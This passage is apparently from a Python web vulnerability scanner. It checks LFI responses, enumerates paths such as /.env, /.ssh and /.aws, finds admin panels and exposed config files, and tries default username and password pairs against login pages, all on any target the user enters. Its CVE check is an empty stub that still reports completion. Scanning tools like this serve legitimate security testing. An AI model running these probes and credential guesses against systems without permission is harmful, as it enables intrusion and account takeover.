                        lfi_indicators = ['root:', 'bin/bash', 'System32', 'Windows']
                        if any(indicator in response.text for indicator in lfi_indicators):
                            self.results['findings']['web_vulnerabilities'].append({
                                'type': 'Local File Inclusion (LFI)',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'payload': payload,
                                'description': 'LFI vulnerability detected',
                                'recommendation': 'Validate and sanitize file paths'
                            })
                            self.log(f"  ⚠ Potential LFI found", "WARN")
                            break
                    except:
                        pass
        
        except Exception as e:
            self.log(f"  ✗ LFI scan error: {str(e)}", "WARN")
    
    def directory_enumeration(self):
        """Enumerate common directories"""
        try:
            self.log("Enumerating directories...")
            
            common_dirs = [
                '/admin', '/admin/', '/administrator/', '/administrator',
                '/api', '/api/', '/backend', '/backend/',
                '/config', '/config/', '/config.php', '/config.js',
                '/wp-admin', '/wp-content', '/wp-includes',
                '/.git', '/.git/', '/.env', '/.env.example',
                '/uploads', '/upload', '/files', '/downloads',
                '/backup', '/backups', '/db', '/database',
                '/logs', '/log', '/temp', '/tmp', '/cache',
                '/secret', '/secrets', '/private', '/sensitive',
                '/.aws', '/.ssh', '/credentials', '/.venv',
                '/node_modules', '/package.json', '/requirements.txt'
            ]
            
            def check_directory(directory):
                try:
                    url = urljoin(self.target_url, directory)
                    response = self.session.head(url, timeout=5, verify=False, allow_redirects=False)
                    if response.status_code in [200, 301, 302, 403]:
                        return directory, response.status_code
                except:
                    pass
                return None, None
            
            with ThreadPoolExecutor(max_workers=15) as executor:
                futures = [executor.submit(check_directory, directory) for directory in common_dirs]
                for future in as_completed(futures):
                    directory, status = future.result()
                    if directory:
                        self.results['findings']['directories'].append({
                            'path': directory,
                            'status_code': status
                        })
                        self.log(f"  ✓ {directory} (Status: {status})", "INFO")
            
        except Exception as e:
            self.log(f"  ✗ Directory enumeration error: {str(e)}", "WARN")
    
    def admin_panel_detection(self):
        """Detect common admin panels"""
        try:
            self.log("Detecting admin panels...")
            
            admin_urls = [
                '/admin', '/admin/', '/administrator', '/administrator/',
                '/admin.php', '/admin.jsp', '/admin.aspx',
                '/adminpanel', '/admin-panel', '/admin_panel',
                '/backend', '/backend/', '/dashboard', '/dashboard/',
                '/phpmyadmin', '/phpadmin', '/cpanel', '/whm',
                '/management', '/manage', '/control-panel'
            ]
            
            def check_admin(admin_path):
                try:
                    url = urljoin(self.target_url, admin_path)
                    response = self.session.get(url, timeout=5, verify=False, allow_redirects=False)
                    if response.status_code in [200, 301, 302]:
                        return admin_path, response.status_code
                except:
                    pass
                return None, None
            
            with ThreadPoolExecutor(max_workers=15) as executor:
                futures = [executor.submit(check_admin, admin) for admin in admin_urls]
                for future in as_completed(futures):
                    admin_path, status = future.result()
                    if admin_path:
                        self.results['findings']['admin_panels'].append({
                            'path': admin_path,
                            'status_code': status
                        })
                        self.log(f"  ⚠ Admin panel found: {admin_path}", "WARN")
            
        except Exception as e:
            self.log(f"  ✗ Admin panel detection error: {str(e)}", "WARN")
    
    def check_misconfigurations(self):
        """Check for common misconfigurations"""
        try:
            self.log("Checking for misconfigurations...")
            
            config_files = [
                '/.env', '/.env.example', '/config.php', '/config.json',
                '/web.config', '/app.config', '/settings.py', '/settings.js',
                '/.htaccess', '/web.xml', '/beans.xml'
            ]
            
            for config_file in config_files:
                try:
                    url = urljoin(self.target_url, config_file)
                    response = self.session.get(url, timeout=5, verify=False)
                    if response.status_code == 200:
                        self.results['findings']['web_vulnerabilities'].append({
                            'type': 'Exposed Configuration File',
                            'severity': 'CRITICAL',
                            'path': config_file,
                            'description': f'Configuration file exposed: {config_file}',
                            'recommendation': 'Restrict access to configuration files'
                        })
                        self.log(f"  ⚠ Exposed config: {config_file}", "WARN")
                except:
                    pass
            
            backup_extensions = ['.bak', '.backup', '.old', '.swp', '.zip', '.tar.gz']
            for ext in backup_extensions:
                try:
                    url = self.target_url + ext
                    response = self.session.head(url, timeout=5, verify=False)
                    if response.status_code == 200:
                        self.results['findings']['misconfigurations'].append({
                            'type': 'Backup File Exposed',
                            'severity': 'HIGH',
                            'file': url,
                            'description': f'Backup file found: {url}'
                        })
                        self.log(f"  ⚠ Backup file found: {url}", "WARN")
                except:
                    pass
        
        except Exception as e:
            self.log(f"  ✗ Misconfiguration check error: {str(e)}", "WARN")
    
    def check_default_credentials(self):
        """Test for default credentials"""
        try:
            self.log("Testing default credentials...")
            
            default_creds = [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('root', 'root'),
                ('root', 'password'),
                ('root', '123456'),
                ('test', 'test'),
                ('user', 'user'),
                ('administrator', 'administrator')
            ]
            
            login_urls = [
                f"{self.target_url}/login",
                f"{self.target_url}/admin/login",
                f"{self.target_url}/user/login"
            ]
            
            for login_url in login_urls:
                for username, password in default_creds:
                    try:
                        data = {
                            'username': username,
                            'password': password,
                            'user': username,
                            'pass': password,
                            'login': username
                        }
                        response = self.session.post(login_url, data=data, timeout=5, verify=False)
                        
                        success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'settings']
                        if any(indicator in response.text.lower() for indicator in success_indicators):
                            self.results['findings']['weak_credentials'].append({
                                'url': login_url,
                                'username': username,
                                'password': password,
                                'severity': 'CRITICAL'
                            })
                            self.log(f"  ⚠ Valid credentials found: {username}:{password}", "WARN")
                    except:
                        pass
        
        except Exception as e:
            self.log(f"  ✗ Default credentials check error: {str(e)}", "WARN")
    
    def cve_detection(self):
        """Detect known CVEs based on service versions"""
        try:
            self.log("Checking for known CVEs...")
            self.log("  ✓ CVE check completed", "SUCCESS")
        
        except Exception as e:
            self.log(f"  ✗ CVE detection error: {str(e)}", "WARN")
    
    def calculate_risk_level(self):
        """Calculate overall risk level"""
        critical_count = 0
        high_count = 0
        medium_count = 0
        
        for vuln in self.results['findings']['web_vulnerabilities']:
            severity = vuln.get('severity', 'LOW')
            if severity == 'CRITICAL':
                critical_count += 1
            elif severity == 'HIGH':
                high_count += 1
            elif severity == 'MEDIUM':
                medium_count += 1
        
        # Add counts from other vulnerability categories
        critical_count += len(self.results['findings']['sql_injection'])
        critical_count += len(self.results['findings']['authentication_bypass'])
        high_count += len(self.results['findings']['advanced_payloads'])
        
        if critical_count > 0:
            self.results['risk_level'] = 'CRITICAL'
        elif high_count > 2:
            self.results['risk_level'] = 'HIGH'
        elif medium_count > 3 or high_count > 0:
            self.results['risk_level'] = 'MEDIUM'
        else:
            self.results['risk_level'] = 'LOW'
        
        self.results['summary'] = {
            'total_vulnerabilities': len(self.results['findings']['web_vulnerabilities']),
            'sql_injections': len(self.results['findings']['sql_injection']),
            'auth_bypasses': len(self.results['findings']['authentication_bypass']),
            'advanced_payloads': len(self.results['findings']['advanced_payloads']),
            'critical': critical_count,
            'high': high_count,
            'medium': medium_count,
            'open_ports': len(self.results['findings']['port_scan']),
            'services_detected': len(self.results['findings']['services']),
            'directories_found': len(self.results['findings']['directories']),
            'admin_panels': len(self.results['findings']['admin_panels'])
        }


def main():
    print("""
    ╔══════════════════════════════════════════════════════════════════════╗
    ║       ADVANCED VULNERABILITY SCANNER v2.0 - FULL ARSENAL             ║
    ║  Nmap Integration • SQLmap • Advanced Payloads • Auth Bypass Testing  ║
    ╚══════════════════════════════════════════════════════════════════════╝
    """)
    
    target_ip = input("📍 Enter target IP address: ").strip()
    target_url = input("🌐 Enter target URL (e.g., http://example.com): ").strip()
    
    if not target_ip or not target_url:
        print("❌ Both IP and URL are required!")
        sys.exit(1)
    
    try:
        socket.inet_aton(target_ip)
    except socket.error:
        print(f"❌ Invalid IP address: {target_ip}")
        sys.exit(1)
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    scanner = AdvancedVulnerabilityScanner(target_ip, target_url)
    results = scanner.run_full_scan()
    
    # Display results
    print("\n" + "="*70)
    print("📊 SCAN RESULTS SUMMARY")
    print("="*70 + "\n")
    
    print(f"🎯 Target IP: {results['target_ip']}")
    print(f"🌐 Target URL: {results['target_url']}")
    print(f"⚠️  Risk Level: {results['risk_level']}")
    print(f"⏰ Scan Time: {results['scan_time']}\n")
    
    print("📈 Summary:")
    for key, value in results['summary'].items():
        print(f"   {key}: {value}")
    
    if results['tools_used']:
        print(f"\n🛠️  Tools Used: {', '.join(results['tools_used'])}")
    
    output_file = f"scan_results_advanced_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n✅ Full results saved to: {output_file}")
    
    if results['findings']['web_vulnerabilities']:
        print("\n" + "="*70)
        print("🔴 VULNERABILITIES FOUND")
        print("="*70 + "\n")
        
        for i, vuln in enumerate(results['findings']['web_vulnerabilities'][:20], 1):
            print(f"{i}. {vuln['type']} ({vuln['severity']})")
            print(f"   Description: {vuln['description']}")
            print(f"   Recommendation: {vuln['recommendation']}\n")


if __name__ == "__main__":
    main()

